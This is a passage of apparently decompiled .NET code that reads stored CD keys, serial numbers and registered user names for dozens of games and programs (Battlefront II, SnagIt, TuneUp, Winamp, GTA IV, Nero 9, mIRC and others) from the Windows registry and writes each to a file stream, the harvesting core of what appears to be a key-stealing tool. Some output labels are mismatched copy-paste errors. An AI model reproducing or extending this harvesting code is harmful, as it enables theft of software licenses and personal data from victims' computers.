					goto IL_3dd1;
					IL_3dd1:
					ProjectData.ClearProjectError();
					num3 = -147;
					goto IL_3ddd;
					IL_3ddd:
					num = 863;
					text145 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Atari\\Sid Meier's Pirates!", "CDKey", null));
					goto IL_3dfb;
					IL_3dfb:
					num = 864;
					streamWriter.WriteLine("Sid(Meier) 's Pirates! : " + text145);
					goto IL_3e15;
					IL_3e15:
					num = 865;
					streamWriter.Flush();
					goto IL_3e23;
					IL_3e23:
					num = 866;
					streamWriter.WriteLine(string.Empty);
					goto IL_3e36;
					IL_3e36:
					num = 867;
					streamWriter.Flush();
					goto IL_3e44;
					IL_3e44:
					ProjectData.ClearProjectError();
					num3 = -148;
					goto IL_3e50;
					IL_3e50:
					num = 869;
					text146 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Ubisoft\\SILENT HUNTER III\\Keys", "DiscKey_SH3", null));
					goto IL_3e6e;
					IL_3e6e:
					num = 870;
					streamWriter.WriteLine("Sid(Meier) 's Pirates! : " + text146);
					goto IL_3e88;
					IL_3e88:
					num = 871;
					streamWriter.Flush();
					goto IL_3e96;
					IL_3e96:
					num = 872;
					streamWriter.WriteLine(string.Empty);
					goto IL_3ea9;
					IL_3ea9:
					num = 873;
					streamWriter.Flush();
					goto IL_3eb7;
					IL_3eb7:
					ProjectData.ClearProjectError();
					num3 = -149;
					goto IL_3ec3;
					IL_3ec3:
					num = 875;
					text147 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\Maxis\\ Sim City 4 Deluxe", "ergc", null));
					goto IL_3ee1;
					IL_3ee1:
					num = 876;
					streamWriter.WriteLine("Sim City 4 Deluxe : " + text147);
					goto IL_3efb;
					IL_3efb:
					num = 877;
					streamWriter.Flush();
					goto IL_3f09;
					IL_3f09:
					num = 878;
					streamWriter.WriteLine(string.Empty);
					goto IL_3f1c;
					IL_3f1c:
					num = 879;
					streamWriter.Flush();
					goto IL_3f2a;
					IL_3f2a:
					ProjectData.ClearProjectError();
					num3 = -150;
					goto IL_3f36;
					IL_3f36:
					num = 881;
					text148 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\Maxis\\ Sim City 4", "ergc", null));
					goto IL_3f54;
					IL_3f54:
					num = 882;
					streamWriter.WriteLine("Sim City 4 : " + text148);
					goto IL_3f6e;
					IL_3f6e:
					num = 883;
					streamWriter.Flush();
					goto IL_3f7c;
					IL_3f7c:
					num = 884;
					streamWriter.WriteLine(string.Empty);
					goto IL_3f8f;
					IL_3f8f:
					num = 885;
					streamWriter.Flush();
					goto IL_3f9d;
					IL_3f9d:
					ProjectData.ClearProjectError();
					num3 = -151;
					goto IL_3fa9;
					IL_3fa9:
					num = 887;
					text149 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Network Associates, Inc.\\Sniffer Pro\\4.5\\USER", "SerialNumber", null));
					goto IL_3fc7;
					IL_3fc7:
					num = 888;
					streamWriter.WriteLine("Sniffer Pro 4.5 : " + text149);
					goto IL_3fe1;
					IL_3fe1:
					num = 889;
					streamWriter.Flush();
					goto IL_3fef;
					IL_3fef:
					num = 890;
					streamWriter.WriteLine(string.Empty);
					goto IL_4002;
					IL_4002:
					num = 891;
					streamWriter.Flush();
					goto IL_4010;
					IL_4010:
					ProjectData.ClearProjectError();
					num3 = -152;
					goto IL_401c;
					IL_401c:
					num = 893;
					text150 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Silver Style Entertainment\\Soldiers Of Anarchy", "Settings", null));
					goto IL_403a;
					IL_403a:
					num = 894;
					streamWriter.WriteLine("Soldiers Of Anarchy : " + text150);
					goto IL_4054;
					IL_4054:
					num = 895;
					streamWriter.Flush();
					goto IL_4062;
					IL_4062:
					num = 896;
					streamWriter.WriteLine(string.Empty);
					goto IL_4075;
					IL_4075:
					num = 897;
					streamWriter.Flush();
					goto IL_4083;
					IL_4083:
					ProjectData.ClearProjectError();
					num3 = -153;
					goto IL_408f;
					IL_408f:
					num = 899;
					text151 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Silver Style Entertainment\\Soldiers Of Anarchy", "Settings", null));
					goto IL_40ad;
					IL_40ad:
					num = 900;
					streamWriter.WriteLine("Soldiers Of Anarchy : " + text151);
					goto IL_40c7;
					IL_40c7:
					num = 901;
					streamWriter.Flush();
					goto IL_40d5;
					IL_40d5:
					num = 902;
					streamWriter.WriteLine(string.Empty);
					goto IL_40e8;
					IL_40e8:
					num = 903;
					streamWriter.Flush();
					goto IL_40f6;
					IL_40f6:
					ProjectData.ClearProjectError();
					num3 = -154;
					goto IL_4102;
					IL_4102:
					num = 905;
					text152 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\GSC Game World\\STALKER-SHOC", "InstallCDKEY", null));
					goto IL_4120;
					IL_4120:
					num = 906;
					streamWriter.WriteLine("Stalker - Shadow of Chernobyl : " + text152);
					goto IL_413a;
					IL_413a:
					num = 907;
					streamWriter.Flush();
					goto IL_4148;
					IL_4148:
					num = 908;
					streamWriter.WriteLine(string.Empty);
					goto IL_415b;
					IL_415b:
					num = 909;
					streamWriter.Flush();
					goto IL_4169;
					IL_4169:
					ProjectData.ClearProjectError();
					num3 = -155;
					goto IL_4175;
					IL_4175:
					num = 911;
					text153 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\LucasArts\\Star Wars Battlefront II\\1.0", "CD Key", null));
					goto IL_4193;
					IL_4193:
					num = 912;
					streamWriter.WriteLine("Star Wars Battlefront II (v1.0) : " + text153);
					goto IL_41ad;
					IL_41ad:
					num = 913;
					streamWriter.Flush();
					goto IL_41bb;
					IL_41bb:
					num = 914;
					streamWriter.WriteLine(string.Empty);
					goto IL_41ce;
					IL_41ce:
					num = 915;
					streamWriter.Flush();
					goto IL_41dc;
					IL_41dc:
					ProjectData.ClearProjectError();
					num3 = -156;
					goto IL_41e8;
					IL_41e8:
					num = 917;
					text154 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\LucasArts\\Star Wars Battlefront II\\1.1", "CD Key", null));
					goto IL_4206;
					IL_4206:
					num = 918;
					streamWriter.WriteLine("Star Wars Battlefront II (v1.1) : " + text154);
					goto IL_4220;
					IL_4220:
					num = 919;
					streamWriter.Flush();
					goto IL_422e;
					IL_422e:
					num = 920;
					streamWriter.WriteLine(string.Empty);
					goto IL_4241;
					IL_4241:
					num = 921;
					streamWriter.Flush();
					goto IL_424f;
					IL_424f:
					ProjectData.ClearProjectError();
					num3 = -157;
					goto IL_425b;
					IL_425b:
					num = 923;
					text155 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Steganos\\SIAVPN", "ClientID", null));
					goto IL_4279;
					IL_4279:
					num = 924;
					streamWriter.WriteLine("Steganos Internet Anonym VPN : " + text155);
					goto IL_4293;
					IL_4293:
					num = 925;
					streamWriter.Flush();
					goto IL_42a1;
					IL_42a1:
					num = 926;
					streamWriter.WriteLine(string.Empty);
					goto IL_42b4;
					IL_42b4:
					num = 927;
					streamWriter.Flush();
					goto IL_42c2;
					IL_42c2:
					ProjectData.ClearProjectError();
					num3 = -158;
					goto IL_42ce;
					IL_42ce:
					num = 929;
					text156 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Steganos\\SIAVPN", "ClientID", null));
					goto IL_42ec;
					IL_42ec:
					num = 930;
					streamWriter.WriteLine("Splinter Cell Pandora Tomorrow : " + text156);
					goto IL_4306;
					IL_4306:
					num = 931;
					streamWriter.Flush();
					goto IL_4314;
					IL_4314:
					num = 932;
					streamWriter.WriteLine(string.Empty);
					goto IL_4327;
					IL_4327:
					num = 933;
					streamWriter.Flush();
					goto IL_4335;
					IL_4335:
					ProjectData.ClearProjectError();
					num3 = -159;
					goto IL_4341;
					IL_4341:
					num = 935;
					text157 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\THQ\\Gas Powered Games\\Supreme Commander", "KEY", null));
					goto IL_435f;
					IL_435f:
					num = 936;
					streamWriter.WriteLine("Surpreme Commander : " + text157);
					goto IL_4379;
					IL_4379:
					num = 937;
					streamWriter.Flush();
					goto IL_4387;
					IL_4387:
					num = 938;
					streamWriter.WriteLine(string.Empty);
					goto IL_439a;
					IL_439a:
					num = 939;
					streamWriter.Flush();
					goto IL_43a8;
					IL_43a8:
					ProjectData.ClearProjectError();
					num3 = -160;
					goto IL_43b4;
					IL_43b4:
					num = 941;
					text158 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Sierra\\CDKey", "swat2", null));
					goto IL_43d2;
					IL_43d2:
					num = 942;
					streamWriter.WriteLine("S.W.A.T 2 : " + text158);
					goto IL_43ec;
					IL_43ec:
					num = 943;
					streamWriter.Flush();
					goto IL_43fa;
					IL_43fa:
					num = 944;
					streamWriter.WriteLine(string.Empty);
					goto IL_440d;
					IL_440d:
					num = 945;
					streamWriter.Flush();
					goto IL_441b;
					IL_441b:
					ProjectData.ClearProjectError();
					num3 = -161;
					goto IL_4427;
					IL_4427:
					num = 947;
					text159 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Sierra\\CDKey", "swat3", null));
					goto IL_4445;
					IL_4445:
					num = 948;
					streamWriter.WriteLine("S.W.A.T 3 : " + text159);
					goto IL_445f;
					IL_445f:
					num = 949;
					streamWriter.Flush();
					goto IL_446d;
					IL_446d:
					num = 950;
					streamWriter.WriteLine(string.Empty);
					goto IL_4480;
					IL_4480:
					num = 951;
					streamWriter.Flush();
					goto IL_448e;
					IL_448e:
					ProjectData.ClearProjectError();
					num3 = -162;
					goto IL_449a;
					IL_449a:
					num = 953;
					text160 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Sierra\\CDKey", "swat4", null));
					goto IL_44b8;
					IL_44b8:
					num = 954;
					streamWriter.WriteLine("S.W.A.T 4 : " + text160);
					goto IL_44d2;
					IL_44d2:
					num = 955;
					streamWriter.Flush();
					goto IL_44e0;
					IL_44e0:
					num = 956;
					streamWriter.WriteLine(string.Empty);
					goto IL_44f3;
					IL_44f3:
					num = 957;
					streamWriter.Flush();
					goto IL_4501;
					IL_4501:
					ProjectData.ClearProjectError();
					num3 = -163;
					goto IL_450d;
					IL_450d:
					num = 959;
					text161 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TechSmith\\SnagIt\\8", "RegisteredTo", null));
					goto IL_452b;
					IL_452b:
					num = 960;
					streamWriter.WriteLine("TechSmith SnagIt (Name) : " + text161);
					goto IL_4545;
					IL_4545:
					num = 961;
					streamWriter.Flush();
					goto IL_4553;
					IL_4553:
					num = 962;
					streamWriter.WriteLine(string.Empty);
					goto IL_4566;
					IL_4566:
					num = 963;
					streamWriter.Flush();
					goto IL_4574;
					IL_4574:
					ProjectData.ClearProjectError();
					num3 = -164;
					goto IL_4580;
					IL_4580:
					num = 965;
					text162 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TechSmith\\SnagIt\\8", "RegistrationKey", null));
					goto IL_459e;
					IL_459e:
					num = 966;
					streamWriter.WriteLine("TechSmith SnagIt (Name) : " + text162);
					goto IL_45b8;
					IL_45b8:
					num = 967;
					streamWriter.Flush();
					goto IL_45c6;
					IL_45c6:
					num = 968;
					streamWriter.WriteLine(string.Empty);
					goto IL_45d9;
					IL_45d9:
					num = 969;
					streamWriter.Flush();
					goto IL_45e7;
					IL_45e7:
					ProjectData.ClearProjectError();
					num3 = -165;
					goto IL_45f3;
					IL_45f3:
					num = 971;
					text163 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TechSmith\\SnagIt\\8", "RegistrationKey", null));
					goto IL_4611;
					IL_4611:
					num = 972;
					streamWriter.WriteLine("TechSmith SnagIt (Serial) : " + text163);
					goto IL_462b;
					IL_462b:
					num = 973;
					streamWriter.Flush();
					goto IL_4639;
					IL_4639:
					num = 974;
					streamWriter.WriteLine(string.Empty);
					goto IL_464c;
					IL_464c:
					num = 975;
					streamWriter.Flush();
					goto IL_465a;
					IL_465a:
					ProjectData.ClearProjectError();
					num3 = -166;
					goto IL_4666;
					IL_4666:
					num = 977;
					text164 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TexasCalc\\License", "Owner Name", null));
					goto IL_4684;
					IL_4684:
					num = 978;
					streamWriter.WriteLine("Texas Calculatem 4 (Owner) : " + text164);
					goto IL_469e;
					IL_469e:
					num = 979;
					streamWriter.Flush();
					goto IL_46ac;
					IL_46ac:
					num = 980;
					streamWriter.WriteLine(string.Empty);
					goto IL_46bf;
					IL_46bf:
					num = 981;
					streamWriter.Flush();
					goto IL_46cd;
					IL_46cd:
					ProjectData.ClearProjectError();
					num3 = -167;
					goto IL_46d9;
					IL_46d9:
					num = 983;
					text165 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TexasCalc\\License", "Registration Key", null));
					goto IL_46f7;
					IL_46f7:
					num = 984;
					streamWriter.WriteLine("Texas Calculatem 4 (Owner) : " + text165);
					goto IL_4711;
					IL_4711:
					num = 985;
					streamWriter.Flush();
					goto IL_471f;
					IL_471f:
					num = 986;
					streamWriter.WriteLine(string.Empty);
					goto IL_4732;
					IL_4732:
					num = 987;
					streamWriter.Flush();
					goto IL_4740;
					IL_4740:
					ProjectData.ClearProjectError();
					num3 = -168;
					goto IL_474c;
					IL_474c:
					num = 989;
					text166 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Games\\The Battle for Middle-earth", "ergc", null));
					goto IL_476a;
					IL_476a:
					num = 990;
					streamWriter.WriteLine("The Battle for Middle-earth : " + text166);
					goto IL_4784;
					IL_4784:
					num = 991;
					streamWriter.Flush();
					goto IL_4792;
					IL_4792:
					num = 992;
					streamWriter.WriteLine(string.Empty);
					goto IL_47a5;
					IL_47a5:
					num = 993;
					streamWriter.Flush();
					goto IL_47b3;
					IL_47b3:
					ProjectData.ClearProjectError();
					num3 = -169;
					goto IL_47bf;
					IL_47bf:
					num = 995;
					text167 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Games\\The Orange Box", "ergc", null));
					goto IL_47dd;
					IL_47dd:
					num = 996;
					streamWriter.WriteLine("The Orange Box : " + text167);
					goto IL_47f7;
					IL_47f7:
					num = 997;
					streamWriter.Flush();
					goto IL_4805;
					IL_4805:
					num = 998;
					streamWriter.WriteLine(string.Empty);
					goto IL_4818;
					IL_4818:
					num = 999;
					streamWriter.Flush();
					goto IL_4826;
					IL_4826:
					ProjectData.ClearProjectError();
					num3 = -170;
					goto IL_4832;
					IL_4832:
					num = 1001;
					text168 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Sierra\\CDKey", "Timeshift", null));
					goto IL_4850;
					IL_4850:
					num = 1002;
					streamWriter.WriteLine("The Orange Box : " + text168);
					goto IL_486a;
					IL_486a:
					num = 1003;
					streamWriter.Flush();
					goto IL_4878;
					IL_4878:
					num = 1004;
					streamWriter.WriteLine(string.Empty);
					goto IL_488b;
					IL_488b:
					num = 1005;
					streamWriter.Flush();
					goto IL_4899;
					IL_4899:
					ProjectData.ClearProjectError();
					num3 = -171;
					goto IL_48a5;
					IL_48a5:
					num = 1007;
					text169 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Pegasys Inc.\\TMPGEnc DVD Author\\1.0", "RegistrationCode", null));
					goto IL_48c3;
					IL_48c3:
					num = 1008;
					streamWriter.WriteLine("TMPGEnc DVD Author : " + text169);
					goto IL_48dd;
					IL_48dd:
					num = 1009;
					streamWriter.Flush();
					goto IL_48eb;
					IL_48eb:
					num = 1010;
					streamWriter.WriteLine(string.Empty);
					goto IL_48fe;
					IL_48fe:
					num = 1011;
					streamWriter.Flush();
					goto IL_490c;
					IL_490c:
					ProjectData.ClearProjectError();
					num3 = -172;
					goto IL_4918;
					IL_4918:
					num = 1013;
					text170 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\6.0", "UserName", null));
					goto IL_4936;
					IL_4936:
					num = 1014;
					streamWriter.WriteLine("TuneUp 2007 (Name) : " + text170);
					goto IL_4950;
					IL_4950:
					num = 1015;
					streamWriter.Flush();
					goto IL_495e;
					IL_495e:
					num = 1016;
					streamWriter.WriteLine(string.Empty);
					goto IL_4971;
					IL_4971:
					num = 1017;
					streamWriter.Flush();
					goto IL_497f;
					IL_497f:
					ProjectData.ClearProjectError();
					num3 = -173;
					goto IL_498b;
					IL_498b:
					num = 1019;
					text171 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\6.0", "RegCode", null));
					goto IL_49a9;
					IL_49a9:
					num = 1020;
					streamWriter.WriteLine("TuneUp 2007 (Key) : " + text171);
					goto IL_49c3;
					IL_49c3:
					num = 1021;
					streamWriter.Flush();
					goto IL_49d1;
					IL_49d1:
					num = 1022;
					streamWriter.WriteLine(string.Empty);
					goto IL_49e4;
					IL_49e4:
					num = 1023;
					streamWriter.Flush();
					goto IL_49f2;
					IL_49f2:
					ProjectData.ClearProjectError();
					num3 = -174;
					goto IL_49fe;
					IL_49fe:
					num = 1025;
					text172 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\6.0", "Company", null));
					goto IL_4a1c;
					IL_4a1c:
					num = 1026;
					streamWriter.WriteLine("TuneUp 2007 (Company) : " + text172);
					goto IL_4a36;
					IL_4a36:
					num = 1027;
					streamWriter.Flush();
					goto IL_4a44;
					IL_4a44:
					num = 1028;
					streamWriter.WriteLine(string.Empty);
					goto IL_4a57;
					IL_4a57:
					num = 1029;
					streamWriter.Flush();
					goto IL_4a65;
					IL_4a65:
					ProjectData.ClearProjectError();
					num3 = -175;
					goto IL_4a71;
					IL_4a71:
					num = 1031;
					text173 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\7.0", "UserName", null));
					goto IL_4a8f;
					IL_4a8f:
					num = 1032;
					streamWriter.WriteLine("TuneUp 2008 (Name) : " + text173);
					goto IL_4aa9;
					IL_4aa9:
					num = 1033;
					streamWriter.Flush();
					goto IL_4ab7;
					IL_4ab7:
					num = 1034;
					streamWriter.WriteLine(string.Empty);
					goto IL_4aca;
					IL_4aca:
					num = 1035;
					streamWriter.Flush();
					goto IL_4ad8;
					IL_4ad8:
					ProjectData.ClearProjectError();
					num3 = -176;
					goto IL_4ae4;
					IL_4ae4:
					num = 1037;
					text174 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\7.0", "RegCode", null));
					goto IL_4b02;
					IL_4b02:
					num = 1038;
					streamWriter.WriteLine("TuneUp 2008 (Key) : " + text174);
					goto IL_4b1c;
					IL_4b1c:
					num = 1039;
					streamWriter.Flush();
					goto IL_4b2a;
					IL_4b2a:
					num = 1040;
					streamWriter.WriteLine(string.Empty);
					goto IL_4b3d;
					IL_4b3d:
					num = 1041;
					streamWriter.Flush();
					goto IL_4b4b;
					IL_4b4b:
					ProjectData.ClearProjectError();
					num3 = -177;
					goto IL_4b57;
					IL_4b57:
					num = 1043;
					text175 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\7.0", "Company", null));
					goto IL_4b75;
					IL_4b75:
					num = 1044;
					streamWriter.WriteLine("TuneUp 2008 (Company) : " + text175);
					goto IL_4b8f;
					IL_4b8f:
					num = 1045;
					streamWriter.Flush();
					goto IL_4b9d;
					IL_4b9d:
					num = 1046;
					streamWriter.WriteLine(string.Empty);
					goto IL_4bb0;
					IL_4bb0:
					num = 1047;
					streamWriter.Flush();
					goto IL_4bbe;
					IL_4bbe:
					ProjectData.ClearProjectError();
					num3 = -178;
					goto IL_4bca;
					IL_4bca:
					num = 1049;
					text176 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\8.0", "UserName", null));
					goto IL_4be8;
					IL_4be8:
					num = 1050;
					streamWriter.WriteLine("TuneUp 2009 (Name) : " + text176);
					goto IL_4c02;
					IL_4c02:
					num = 1051;
					streamWriter.Flush();
					goto IL_4c10;
					IL_4c10:
					num = 1052;
					streamWriter.WriteLine(string.Empty);
					goto IL_4c23;
					IL_4c23:
					num = 1053;
					streamWriter.Flush();
					goto IL_4c31;
					IL_4c31:
					ProjectData.ClearProjectError();
					num3 = -179;
					goto IL_4c3d;
					IL_4c3d:
					num = 1055;
					text177 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\8.0", "ProductKey", null));
					goto IL_4c5b;
					IL_4c5b:
					num = 1056;
					streamWriter.WriteLine("TuneUp 2009 (Key) : " + text177);
					goto IL_4c75;
					IL_4c75:
					num = 1057;
					streamWriter.Flush();
					goto IL_4c83;
					IL_4c83:
					num = 1058;
					streamWriter.WriteLine(string.Empty);
					goto IL_4c96;
					IL_4c96:
					num = 1059;
					streamWriter.Flush();
					goto IL_4ca4;
					IL_4ca4:
					ProjectData.ClearProjectError();
					num3 = -180;
					goto IL_4cb0;
					IL_4cb0:
					num = 1061;
					text178 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\8.0", "Company", null));
					goto IL_4cce;
					IL_4cce:
					num = 1062;
					streamWriter.WriteLine("TuneUp 2009 (Company) : " + text178);
					goto IL_4ce8;
					IL_4ce8:
					num = 1063;
					streamWriter.Flush();
					goto IL_4cf6;
					IL_4cf6:
					num = 1064;
					streamWriter.WriteLine(string.Empty);
					goto IL_4d09;
					IL_4d09:
					num = 1065;
					streamWriter.Flush();
					goto IL_4d17;
					IL_4d17:
					ProjectData.ClearProjectError();
					num3 = -181;
					goto IL_4d23;
					IL_4d23:
					num = 1067;
					text179 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Nullsoft\\Winamp", "regname", null));
					goto IL_4d41;
					IL_4d41:
					num = 1068;
					streamWriter.WriteLine("Winamp (Username) : " + text179);
					goto IL_4d5b;
					IL_4d5b:
					num = 1069;
					streamWriter.Flush();
					goto IL_4d69;
					IL_4d69:
					num = 1070;
					streamWriter.WriteLine(string.Empty);
					goto IL_4d7c;
					IL_4d7c:
					num = 1071;
					streamWriter.Flush();
					goto IL_4d8a;
					IL_4d8a:
					ProjectData.ClearProjectError();
					num3 = -182;
					goto IL_4d96;
					IL_4d96:
					num = 1073;
					text180 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Nullsoft\\Winamp", "regkey", null));
					goto IL_4db4;
					IL_4db4:
					num = 1074;
					streamWriter.WriteLine("Winamp (Serial) : " + text180);
					goto IL_4dce;
					IL_4dce:
					num = 1075;
					streamWriter.Flush();
					goto IL_4ddc;
					IL_4ddc:
					num = 1076;
					streamWriter.WriteLine(string.Empty);
					goto IL_4def;
					IL_4def:
					num = 1077;
					streamWriter.Flush();
					goto IL_4dfd;
					IL_4dfd:
					ProjectData.ClearProjectError();
					num3 = -183;
					goto IL_4e09;
					IL_4e09:
					num = 1079;
					text181 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Sims\\The Sims 3\\ergc", string.Empty, "E_NotFound"));
					goto IL_4e2b;
					IL_4e2b:
					num = 1080;
					streamWriter.WriteLine("The Sims 3 : " + text181);
					goto IL_4e45;
					IL_4e45:
					num = 1081;
					streamWriter.Flush();
					goto IL_4e53;
					IL_4e53:
					num = 1082;
					streamWriter.WriteLine(string.Empty);
					goto IL_4e66;
					IL_4e66:
					num = 1083;
					streamWriter.Flush();
					goto IL_4e74;
					IL_4e74:
					ProjectData.ClearProjectError();
					num3 = -184;
					goto IL_4e80;
					IL_4e80:
					num = 1085;
					text182 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\SPORE(TM)\\ergc ", string.Empty, "E_NotFound"));
					goto IL_4ea2;
					IL_4ea2:
					num = 1086;
					streamWriter.WriteLine("Spore : " + text182);
					goto IL_4ebc;
					IL_4ebc:
					num = 1087;
					streamWriter.Flush();
					goto IL_4eca;
					IL_4eca:
					num = 1088;
					streamWriter.WriteLine(string.Empty);
					goto IL_4edd;
					IL_4edd:
					num = 1089;
					streamWriter.Flush();
					goto IL_4eeb;
					IL_4eeb:
					ProjectData.ClearProjectError();
					num3 = -185;
					goto IL_4ef7;
					IL_4ef7:
					num = 1091;
					text183 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Mirror's Edge\\ergc ", string.Empty, "E_NotFound"));
					goto IL_4f19;
					IL_4f19:
					num = 1092;
					streamWriter.WriteLine("Mirrors Edge : " + text183);
					goto IL_4f33;
					IL_4f33:
					num = 1093;
					streamWriter.Flush();
					goto IL_4f41;
					IL_4f41:
					num = 1094;
					streamWriter.WriteLine(string.Empty);
					goto IL_4f54;
					IL_4f54:
					num = 1095;
					streamWriter.Flush();
					goto IL_4f62;
					IL_4f62:
					ProjectData.ClearProjectError();
					num3 = -186;
					goto IL_4f6e;
					IL_4f6e:
					num = 1097;
					text184 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Rockstar Games\\Grand Theft Auto IV", string.Empty, "CDKey"));
					goto IL_4f90;
					IL_4f90:
					num = 1098;
					streamWriter.WriteLine("GTA IV : " + text184);
					goto IL_4faa;
					IL_4faa:
					num = 1099;
					streamWriter.Flush();
					goto IL_4fb8;
					IL_4fb8:
					num = 1100;
					streamWriter.WriteLine(string.Empty);
					goto IL_4fcb;
					IL_4fcb:
					num = 1101;
					streamWriter.Flush();
					goto IL_4fd9;
					IL_4fd9:
					ProjectData.ClearProjectError();
					num3 = -187;
					goto IL_4fe5;
					IL_4fe5:
					num = 1103;
					text185 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Sports\\FIFA 09\\ergc", string.Empty, "E_NotFound"));
					goto IL_5007;
					IL_5007:
					num = 1104;
					streamWriter.WriteLine("FIFA 2009 : " + text185);
					goto IL_5021;
					IL_5021:
					num = 1105;
					streamWriter.Flush();
					goto IL_502f;
					IL_502f:
					num = 1106;
					streamWriter.WriteLine(string.Empty);
					goto IL_5042;
					IL_5042:
					num = 1107;
					streamWriter.Flush();
					goto IL_5050;
					IL_5050:
					ProjectData.ClearProjectError();
					num3 = -188;
					goto IL_505c;
					IL_505c:
					num = 1109;
					text186 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\KONAMI\\PES2009", string.Empty, string.Empty));
					goto IL_507e;
					IL_507e:
					num = 1110;
					streamWriter.WriteLine("Pro Evolution Soccer 2009 : " + text186);
					goto IL_5098;
					IL_5098:
					num = 1111;
					streamWriter.Flush();
					goto IL_50a6;
					IL_50a6:
					num = 1112;
					streamWriter.WriteLine(string.Empty);
					goto IL_50b9;
					IL_50b9:
					num = 1113;
					streamWriter.Flush();
					goto IL_50c7;
					IL_50c7:
					ProjectData.ClearProjectError();
					num3 = -189;
					goto IL_50d3;
					IL_50d3:
					num = 1115;
					text187 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Sports\\FIFA 08\\ergc", string.Empty, "E_NotFound"));
					goto IL_50f5;
					IL_50f5:
					num = 1116;
					streamWriter.WriteLine("FIFA 2008 : " + text187);
					goto IL_510f;
					IL_510f:
					num = 1117;
					streamWriter.Flush();
					goto IL_511d;
					IL_511d:
					num = 1118;
					streamWriter.WriteLine(string.Empty);
					goto IL_5130;
					IL_5130:
					num = 1119;
					streamWriter.Flush();
					goto IL_513e;
					IL_513e:
					ProjectData.ClearProjectError();
					num3 = -190;
					goto IL_514a;
					IL_514a:
					num = 1121;
					text188 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\NERO\\SHARED\\FAMILIES\\NL9", string.Empty, "Serial"));
					goto IL_516c;
					IL_516c:
					num = 1122;
					streamWriter.WriteLine("Nero 9 : " + text188);
					goto IL_5186;
					IL_5186:
					num = 1123;
					streamWriter.Flush();
					goto IL_5194;
					IL_5194:
					num = 1124;
					streamWriter.WriteLine(string.Empty);
					goto IL_51a7;
					IL_51a7:
					num = 1125;
					streamWriter.Flush();
					goto IL_51b5;
					IL_51b5:
					ProjectData.ClearProjectError();
					num3 = -191;
					goto IL_51c1;
					IL_51c1:
					num = 1127;
					text189 = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\Software\\mIRC\\", string.Empty, "UserName"));
					goto IL_51e3;
					IL_51e3:
					num = 1128;
					streamWriter.WriteLine("Mirc (Username) : " + text189);
					goto IL_51fd;
					IL_51fd:
					num = 1129;
					streamWriter.Flush();
					goto IL_520b;
					IL_520b:
					num = 1130;
					streamWriter.WriteLine(string.Empty);
					goto IL_521e;
					IL_521e:
					num = 1131;
					streamWriter.Flush();
					goto IL_522c;
					IL_522c:
					ProjectData.ClearProjectError();
					num3 = -192;
					goto IL_5238;
					IL_5238:
					num = 1133;
